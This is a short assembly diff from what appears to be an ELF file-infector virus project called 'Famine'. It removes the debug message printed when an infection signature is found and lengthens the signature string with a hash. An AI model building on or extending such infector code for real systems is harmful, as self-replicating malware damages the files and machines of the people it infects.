@@ -317,14 +317,7 @@ not_64_bit:
     jmp success
 ; not_64_bit
 
-signature_found_exit:
-    add rsp, 16
-    mov rax, SYS_WRITE
-    mov rdi, 1
-    lea rsi, [rel signature_found_msg]
-    mov rdx, 16
-    syscall
-    
+signature_found_exit:    
     jmp success
 ; signature_found
 
@@ -350,6 +343,6 @@ not_elf_msg:
 file_path:
     db "Famine", 0
 signature:
-    db "abied-ch", 0
+    db "abied-ch:ef082ac137069c1ef08f0a6d54ea4d2f4e180fb2769b9bb9f137cc5f98f5f4fe", 0
 do_infect_msg:
     db "INFECT", 10
